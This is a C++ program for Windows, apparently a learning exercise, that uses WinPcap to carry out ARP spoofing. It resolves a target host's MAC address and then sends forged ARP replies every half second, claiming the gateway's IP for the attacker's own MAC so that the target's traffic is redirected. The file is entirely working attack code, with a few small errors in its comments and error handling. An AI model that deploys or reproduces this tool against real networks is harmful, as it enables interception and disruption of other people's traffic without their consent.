#include <iostream>
#include <string>
#include <pcap.h>
#include <Windows.h>
#include <IPHlpApi.h>
#include <ctime>

#pragma comment(lib, "wpcap.lib")
#pragma comment(lib, "Packet.lib")
#pragma comment(lib, "Iphlpapi.lib") 

using namespace std;


#define ETHERTYPE_ARP 0x0806
#define ETHERTYPE_IP 0x0800
#define ARPHRD_ETHER 1
#define ETH_ALEN  6
#define IP_LEN 4
#define ARPOP_REQUEST 1		/* ARP request.  */
#define	ARPOP_REPLY	2		/* ARP reply.  */


//Ethernet Header
typedef struct ethernet_header
{
	u_char dest[ETH_ALEN]; // dest mac addr
	u_char source[ETH_ALEN]; //src mac addr
	u_short type; // ARP : 0x8086
}ETHER_HDR;

typedef struct arphdr
{
	u_short ar_hrd;		/* Format of hardware address.  */
	u_short ar_pro;		/* Format of protocol address.  */
	u_char ar_hln;		/* Length of hardware address.  */
	u_char ar_pln;		/* Length of protocol address.  */
	u_short ar_op;		/* ARP opcode (command).  */
	u_char source_mac[ETH_ALEN];	/* Sender hardware address.  */
	u_char source_ip[IP_LEN];
	u_char dest_mac[ETH_ALEN];	/* Target hardware address.  */
	u_char dest_ip[IP_LEN];		/* Target IP address.  */
}ARP_HDR;



pcap_t *fp;
pcap_if_t      *allAdapters;
pcap_if_t       *adapter;
struct pcap_pkthdr *header;
char errorBuffer[PCAP_ERRBUF_SIZE];
u_char packet[100];
int i;
int dev_num;

void select_device()
{
	// retrieve the adapters from the computer
	if (pcap_findalldevs_ex(PCAP_SRC_IF_STRING, NULL,
		&allAdapters, errorBuffer) == -1)
	{
		fprintf(stderr, "Error in pcap_findalldevs_ex function: %s\n",
			errorBuffer);
		return ;
	}

	// if there are no adapters, print an error
	if (allAdapters == NULL)
	{
		printf("\nNo adapters found! Make sure WinPcap is installed.\n");
		return ;
	}

	// print the list of adapters along with basic information about an adapter
	int crtAdapter = 0;
	for (adapter = allAdapters; adapter != NULL; adapter = adapter->next)
	{
		printf("\n%d.%s ", ++crtAdapter, adapter->name);
		printf("-- %s\n", adapter->description);
	}

	printf("\n");

	int adapterNumber;

	printf("Enter the adapter number between 1 and %d:", crtAdapter);
	scanf("%d", &adapterNumber);

	if (adapterNumber < 1 || adapterNumber > crtAdapter)
	{
		printf("\nAdapter number out of range.\n");

		// Free the adapter list
		pcap_freealldevs(allAdapters);

		return ;
	}

	// parse the list until we reach the desired adapter
	adapter = allAdapters;
	for (crtAdapter = 0; crtAdapter < adapterNumber - 1; crtAdapter++)
		adapter = adapter->next;

	dev_num = adapterNumber;
}

string get_gatewayip()
{
	IP_ADAPTER_INFO *info = NULL, *pos;
	DWORD size = 0;
	int c = 1;
	string ip;

	GetAdaptersInfo(info, &size);

	info = (IP_ADAPTER_INFO *)malloc(size);

	GetAdaptersInfo(info, &size);

	for (pos = info; pos != NULL; pos = pos->Next) {

		if (dev_num == c)
		{
			ip = string(pos->GatewayList.IpAddress.String);
		}
		c++;
	}

	free(info);

	return ip;
}

void get_networkinfo(string *ip,u_char *mac_addr)
{
	IP_ADAPTER_INFO *info = NULL, *pos;
	DWORD size = 0;
	int c = 1;

	GetAdaptersInfo(info, &size);

	info = (IP_ADAPTER_INFO *)malloc(size);

	GetAdaptersInfo(info, &size);

	for (pos = info; pos != NULL; pos = pos->Next) {

		if (dev_num == c)
		{
			*ip = string(pos->IpAddressList.IpAddress.String);
			memcpy(mac_addr, pos->Address, 6);
		}
		c++;
	}

	free(info);

}

void resolve_mac(string target_ip,u_char *mac_addr)
{
	string ip;
	u_char mac[6];
	get_networkinfo(&ip, mac);
	struct in_addr addr;
	u_char buffer[sizeof(ETHER_HDR) + sizeof(ARP_HDR)];
	int res;
	const u_char *packet;
	ETHER_HDR *eth_hdr;
	ARP_HDR *arp_hdr;

	eth_hdr = (ETHER_HDR *)(buffer);
	arp_hdr = (ARP_HDR *)(buffer + sizeof(ETHER_HDR));

	memcpy(eth_hdr->source, mac, ETH_ALEN);
	memset(eth_hdr->dest, 0xff, ETH_ALEN);
	eth_hdr->type = htons(ETHERTYPE_ARP);


	arp_hdr->ar_hrd = htons(ARPHRD_ETHER);
	arp_hdr->ar_pro = htons(ETHERTYPE_IP);
	arp_hdr->ar_hln = 6;
	arp_hdr->ar_pln = 4;
	arp_hdr->ar_op = htons(ARPOP_REQUEST);

	auto s_ip = inet_addr(ip.c_str());
	auto d_ip = inet_addr(target_ip.c_str());

	memcpy(arp_hdr->source_mac, mac, ETH_ALEN);
	memset(arp_hdr->dest_mac, 0x00, ETH_ALEN);
	memcpy(arp_hdr->source_ip, &s_ip, sizeof(u_int32_t));
	memcpy(arp_hdr->dest_ip, &d_ip, sizeof(u_int32_t));


	pcap_sendpacket(fp, buffer, sizeof(buffer));

	// 타임아웃인 경우를 잘 판별해 주기 위해서 pcap_next_ex 함수를 쓰면 된다.
	while( (res = pcap_next_ex(fp, &header, &packet)) >= 0)
	{
		if (res == 0) // 타임아웃인 경우
			continue;

		eth_hdr = (ETHER_HDR *)(packet);
		arp_hdr = (ARP_HDR *)(packet + sizeof(ETHER_HDR));

		if (ntohs(eth_hdr->type) != ETHERTYPE_ARP)
			continue;

		if ((ntohs(arp_hdr->ar_op) == ARPOP_REPLY) && memcmp(&s_ip, arp_hdr->source_ip, sizeof(u_int32_t)))
		{
			memcpy(mac_addr, arp_hdr->source_mac, ETH_ALEN);
			break;
		}
	}
}

void reply(string target_ip,u_char *target_mac)
{
	string ip, gateway_ip;
	u_char mac[6];
	get_networkinfo(&ip, mac);
	u_char buffer[sizeof(ETHER_HDR) + sizeof(ARP_HDR)];
	ETHER_HDR *eth_hdr;
	ARP_HDR *arp_hdr;

	gateway_ip = get_gatewayip();

	eth_hdr = (ETHER_HDR *)(buffer);
	arp_hdr = (ARP_HDR *)(buffer + sizeof(ETHER_HDR));

	memcpy(eth_hdr->source, mac, ETH_ALEN);
	memcpy(eth_hdr->dest, target_mac, ETH_ALEN);
	eth_hdr->type = htons(ETHERTYPE_ARP);


	arp_hdr->ar_hrd = htons(ARPHRD_ETHER);
	arp_hdr->ar_pro = htons(ETHERTYPE_IP);
	arp_hdr->ar_hln = 6;
	arp_hdr->ar_pln = 4;
	arp_hdr->ar_op = htons(ARPOP_REPLY);

	auto s_ip = inet_addr(gateway_ip.c_str());
	auto d_ip = inet_addr(target_ip.c_str());

	memcpy(arp_hdr->source_mac, mac, ETH_ALEN);
	memcpy(arp_hdr->dest_mac, target_mac, ETH_ALEN);
	memcpy(arp_hdr->source_ip, &s_ip, sizeof(u_int32_t));
	memcpy(arp_hdr->dest_ip, &d_ip, sizeof(u_int32_t));


	pcap_sendpacket(fp, buffer, sizeof(buffer));
}

int main(int argc,char **argv)
{

	u_char mac[6];

	if (argc != 2)
	{
		printf("Usage : %s ip ",argv[0]);
		return 2;
	}

	select_device();

	// open the adapter
	fp = pcap_open(adapter->name, // name of the adapter
		65536,         // portion of the packet to capture
		// 65536 guarantees that the whole 
		// packet will be captured
		PCAP_OPENFLAG_PROMISCUOUS, // promiscuous mode
		1000,             // read timeout - 1 millisecond
		NULL,          // authentication on the remote machine
		errorBuffer    // error buffer
		);

	if (fp == NULL)
	{
		fprintf(stderr, "\nUnable to open the adapter\n", adapter->name);

		// Free the adapter list
		pcap_freealldevs(allAdapters);

		return -1;

	}


	resolve_mac(string(argv[1]),mac);

	while (true)
	{
		reply(string(argv[1]), mac);
		Sleep(500);
	}

	pcap_freealldevs(allAdapters);

	// pcap
	// 대검찰청
	// 명견만리
	// EXIF GPS
	// 컨설팅 문제해결 기법
	// 리버싱
	// CVE
	return 0;
}



/*
for (int i = 0; i < 4; i++)
printf("%x ", arp_hdr->source_ip[i]);
printf("\n");

for (int i = 0; i < sizeof(ETHER_HDR) + sizeof(ARP_HDR); i++)
printf("%02X ", buffer[i]);
*/